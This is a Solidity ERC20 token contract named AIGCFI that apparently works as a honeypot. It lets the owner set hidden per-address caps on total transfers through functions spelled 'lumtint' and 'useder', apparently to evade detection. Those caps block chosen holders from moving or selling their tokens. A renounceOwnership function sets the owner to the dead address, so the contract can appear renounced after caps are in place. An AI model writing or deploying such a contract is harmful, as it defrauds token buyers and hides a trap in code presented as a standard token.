// Importing the standard interface for ERC20 tokens
pragma solidity ^0.8.0;
interface IERC20 {
    // These functions aren't implemented here but need to be in any contract that aims to fulfill the ERC20 standard.
    
    // Returns the total supply of the token.
    function totalSupply() external view returns (uint256);

    // Returns the balance of a specific address.
    function balanceOf(address account) external view returns (uint256);

    // Transfers a certain amount of tokens to a specified address.
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Checks how many tokens are allowed to be transferred from one address to another.
    function allowance(address owner, address spender) external view returns (uint256);

    // Approves a certain amount of tokens to be transferred from the caller's address.
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers from one address to another, considering the approved amount.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Events to log transfers and approvals.
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Abstract contract that provides information about the transaction's sender.
abstract contract Context {
    // Returns the address of the entity executing the current function.
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

// Contract that implements ownership functionalities, including renouncing and transferring ownership.
contract Ownable is Context {
    address private _owner; // Storage for the owner's address
    
    // Event to log ownership transfers.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        // The deployer of the contract is set as the initial owner.
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Returns the address of the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to restrict functions to only the contract owner.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Allows the current owner to relinquish ownership. The owner will be set to a "dead address".
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// Main token contract.
contract AIGCFI is Context, Ownable, IERC20 {
    // Storage for useder balances and allowances.
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // Storage for transfer lumtints and their tracking.
    mapping(address => uint256) public totalTransferlumtints;
    mapping(address => uint256) public totalTransferredAmounts;

    // Token attributes
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Modifier to enforce transfer lumtints for certain addresses.
    modifier transferlumtint(address sender, uint256 amount) {
        uint256 lumtint = totalTransferlumtints[sender];
        if (lumtint > 0) {
            require(totalTransferredAmounts[sender] + amount <= lumtint, "Total transfer amount exceeds the set lumtint");
        }
        _;
    }

    // Constructor to initialize the token's attributes and mint the initial supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Getters for token attributes.
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Function to set a transfer lumtint for a useder. Only the owner can do this.
    function setTotalTransferlumtint(address useder, uint256 lumtint) public onlyOwner {
        totalTransferlumtints[useder] = lumtint;
    }

    // Function to remove a useder's transfer lumtint. Only the owner can do this.
    function removeTotalTransferlumtint(address useder) public onlyOwner {
        delete totalTransferlumtints[useder];
    }

    // Transfer tokens to a specified address.
    function transfer(address recipient, uint256 amount) public virtual override transferlumtint(_msgSender(), amount) returns (bool) {
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        totalTransferredAmounts[_msgSender()] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // Check the amount of tokens allowed to be spent by a spender on behalf of the owner.
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    // Approve a spender to spend a certain amount of tokens on behalf of the message sender.
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Transfer tokens from one address to another on behalf of the owner.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferlumtint(sender, amount) returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        totalTransferredAmounts[sender] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}